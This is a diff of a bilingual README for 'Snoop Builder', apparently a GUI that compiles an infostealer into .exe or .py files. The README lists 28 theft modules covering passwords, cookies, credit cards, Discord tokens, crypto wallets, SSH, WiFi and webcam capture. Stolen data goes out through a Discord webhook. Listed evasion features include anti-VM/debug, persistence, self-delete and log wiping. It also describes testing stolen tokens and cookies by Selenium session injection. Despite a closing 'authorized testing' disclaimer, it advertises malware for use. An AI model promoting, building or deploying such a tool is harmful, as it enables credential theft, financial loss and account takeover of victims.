@@ -1,128 +1,133 @@
+Snoop Builder
+Interface PyQt5 pour configurer et compiler un payload Python en .exe ou .py — modules, sécurité, double compilateur, exfiltration Discord.
 
+Features
+PyQt5 UI — frameless, dark theme, customizable accent color, 4 tabs
 
-```markdown
-<div align="center">
+28 modules — System Info, Passwords, Cookies, Credit Cards, Autofill, Extensions, History, Downloads, Discord Tokens, Discord Metadata, Roblox Cookies, Wallets, Browser Wallets, Game Launchers, Steam Extended, VPN, FTP, SSH, Cloud, Telegram, Signal, Apps, Environment, Product Key, WiFi, Screenshot, Webcam, Files
 
-<br/>
+Firefox — passwords (NSS), cookies, history
 
-<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&pause=1000&color=7C3AED&center=true&vCenter=true&width=700&lines=⚡+SNOOP+BUILDER;Coche+les+modules.;Entre+le+webhook.;Compile+en+.exe+ou+.py.;Exfiltration+Discord." alt="Typing SVG" />
+5 security options — Anti-VM/Debug, Anti-Tamper, Startup Persistence, Self-Delete, Wipe Logs
 
-<br/><br/>
+2 compilers — PyInstaller (fast) or Nuitka (C-compiled)
 
-[![Version](https://img.shields.io/badge/version-5.0.0-7C3AED?style=for-the-badge&logo=github)](https://github.com/weasel743/SnoopBuilder/releases)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![PyQt5](https://img.shields.io/badge/PyQt5-GUI-41CD52?style=for-the-badge&logo=qt&logoColor=white)](https://pypi.org/project/PyQt5/)
-[![License](https://img.shields.io/badge/License-MIT-22C55E?style=for-the-badge)](https://github.com/weasel743/SnoopBuilder/blob/main/LICENSE)
-[![Discord](https://img.shields.io/badge/Discord-Rejoindre-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/VVpAvbE9k4)
+Login — test Discord token, Roblox cookie, generic cookie + Selenium injection
 
-<br/>
+Run
+bash
+python -m venv .venv
+# Windows: .venv\Scripts\activate
+# macOS/Linux: source .venv/bin/activate
+pip install -r requirements.txt
+python builder.py
+On Windows: double-click install.bat then start.bat.
 
-[![Windows](https://img.shields.io/badge/Windows-✓-0078D4?style=flat-square&logo=windows)](https://github.com/weasel743/SnoopBuilder)
-[![Linux](https://img.shields.io/badge/Linux-✓-FCC624?style=flat-square&logo=linux&logoColor=black)](https://github.com/weasel743/SnoopBuilder)
-[![macOS](https://img.shields.io/badge/macOS-✓-000000?style=flat-square&logo=apple)](https://github.com/weasel743/SnoopBuilder)
-[![Modules](https://img.shields.io/badge/Modules-28-A78BFA?style=flat-square)](https://github.com/weasel743/SnoopBuilder#modules)
-
-<br/>
-
-[**📥 Download**](https://github.com/weasel743/SnoopBuilder/releases) &nbsp;·&nbsp;
-[**💬 Discord**](https://discord.gg/VVpAvbE9k4) &nbsp;·&nbsp;
-[**🐛 Issues**](https://github.com/weasel743/SnoopBuilder/issues/new)
-
-</div>
-
----
-
-## 🇬🇧 English
-
-**Snoop Builder** is a PyQt5 GUI to configure and compile a Python payload into `.exe` / `.py` — modules, security, dual compiler, Discord webhook.
-
-- **28 modules** — credentials, Discord tokens, wallets, WiFi, VPN, SSH, cloud, gaming, screenshot, webcam
-- **5 security options** — Anti-VM/Debug · Anti-Tamper · Persistence · Self-Delete · Wipe Logs
-- **2 compilers** — PyInstaller (fast) · Nuitka (C-compiled)
-- **Discord webhook** — cascading embeds + structured single zip
-
-### Install
-
-**Windows** — install [Python 3.10+](https://python.org) (check *Add to PATH*), then:
-
-```bat
-git clone https://github.com/weasel743/SnoopBuilder.git
-cd SnoopBuilder
-install.bat
-```
-
-Linux / macOS
-
-```bash
-git clone https://github.com/weasel743/SnoopBuilder.git && cd SnoopBuilder
-pip install "PyQt5>=5.15.9,<6" requests pyinstaller nuitka
-python3 builder.py
-```
-
+Structure
+text
+SnoopBuilder/
+├── builder.py               # PyQt5 interface
+├── requirements.txt
+├── install.bat
+├── install.sh
+├── start.bat
+├── README.md
+├── assets/
+│   └── logo.png
+└── templates/
+    └── stealer_template.py  # Payload template
 Usage
+Options — Discord webhook, check modules, check security options
 
-```bash
+Builder — file name, output type (.py / .exe), compiler, icon, output folder
+
+Login — test a Discord token or a Roblox / generic cookie
+
+Settings — language EN/FR, accent color
+
+Click Start build — the payload is generated in the chosen folder.
+
+Dependencies
+Python 3.10+
+
+PyQt5, requests, selenium, webdriver-manager
+
+psutil, Pillow, pycryptodomex, pywin32, browser-history
+
+PyInstaller, Nuitka (optional, for .exe compilation)
+
+Selenium requirement
+The "Login browser" buttons need:
+
+text
+pip install selenium webdriver-manager
+Chrome must be installed on the machine.
+
+Note
+The generated payload is intended for security research and authorized testing. Only use it on systems you own or have written authorization for.
+
+
+Fonctionnalités
+Interface PyQt5 — frameless, thème sombre, couleur d'accent personnalisable, 4 onglets
+
+28 modules — System Info, Passwords, Cookies, Credit Cards, Autofill, Extensions, History, Downloads, Discord Tokens, Discord Metadata, Roblox Cookies, Wallets, Browser Wallets, Game Launchers, Steam Extended, VPN, FTP, SSH, Cloud, Telegram, Signal, Apps, Environment, Product Key, WiFi, Screenshot, Webcam, Files
+
+Firefox — passwords (NSS), cookies, history
+
+5 options sécurité — Anti-VM/Debug, Anti-Tamper, Persistance, Self-Delete, Wipe Logs
+
+2 compilateurs — PyInstaller (rapide) ou Nuitka (compilé C)
+
+Login — test token Discord, cookie Roblox, cookie générique + injection Selenium
+
+Lancement
+bash
+python -m venv .venv
+# Windows : .venv\Scripts\activate
+# macOS/Linux : source .venv/bin/activate
+pip install -r requirements.txt
 python builder.py
-```
+Sur Windows : double-clic sur install.bat puis start.bat.
 
-1. Options — webhook URL, modules, security
-2. Builder — name, output type, compiler, icon, path
-3. Start build
-
-Disclaimer
-
-Educational and security research purposes only. Illegal use prohibited.
-
----
-
-🇫🇷 Français
-
-Snoop Builder est une app PyQt5 pour configurer et compiler un payload Python en .exe / .py — modules, sécurité, double compilateur, webhook Discord.
-
-· 28 modules — credentials, tokens Discord, wallets, WiFi, VPN, SSH, cloud, gaming, screenshot, webcam
-· 5 options sécurité — Anti-VM/Debug · Anti-Tamper · Persistance · Self-Delete · Wipe Logs
-· 2 compilateurs — PyInstaller (rapide) · Nuitka (compilé C)
-· Webhook Discord — embeds en cascade + zip unique structuré
-
-Installation
-
-Windows — installe Python 3.10+ (coche Add to PATH), puis :
-
-```bat
-git clone https://github.com/weasel743/SnoopBuilder.git
-cd SnoopBuilder
-install.bat
-```
-
-Linux / macOS
-
-```bash
-git clone https://github.com/weasel743/SnoopBuilder.git && cd SnoopBuilder
-pip install "PyQt5>=5.15.9,<6" requests pyinstaller nuitka
-python3 builder.py
-```
-
+Structure
+text
+SnoopBuilder/
+├── builder.py               # Interface PyQt5
+├── requirements.txt
+├── install.bat
+├── install.sh
+├── start.bat
+├── README.md
+├── assets/
+│   └── logo.png
+└── templates/
+    └── stealer_template.py  # Template du payload
 Utilisation
+Options — webhook Discord, cocher les modules, cocher les options de sécurité
 
-```bash
-python builder.py
-```
+Builder — nom du fichier, type (.py / .exe), compilateur, icône, dossier de sortie
 
-1. Options — URL webhook, modules, sécurité
-2. Builder — nom, type de sortie, compilateur, icône, chemin
-3. Démarrer la construction
+Login — tester un token Discord ou un cookie Roblox / générique
 
-Avertissement
+Paramètres — langue FR/EN, couleur d'accent
 
-À des fins éducatives et de recherche en sécurité uniquement. Usage illégal interdit.
+Clique Démarrer la construction — le payload est généré dans le dossier choisi.
 
----
+Dépendances
+Python 3.10+
 
-<div align="center">⚡ Snoop Builder — Built with ❤️
+PyQt5, requests, selenium, webdriver-manager
 
-⭐ Star  · 
-🍴 Fork  · 
-💬 Discord
+psutil, Pillow, pycryptodomex, pywin32, browser-history
 
-</div>
-```
+PyInstaller, Nuitka (optionnel, pour compiler en .exe)
+
+Prérequis pour Selenium
+Les boutons « Login navigateur » ont besoin de :
+
+text
+pip install selenium webdriver-manager
+Chrome doit être installé sur la machine.
+
+Note
+Le payload généré est destiné à la recherche en sécurité et aux tests autorisés. Ne l'utilise que sur des systèmes dont tu es propriétaire ou pour lesquels tu as une autorisation écrite.
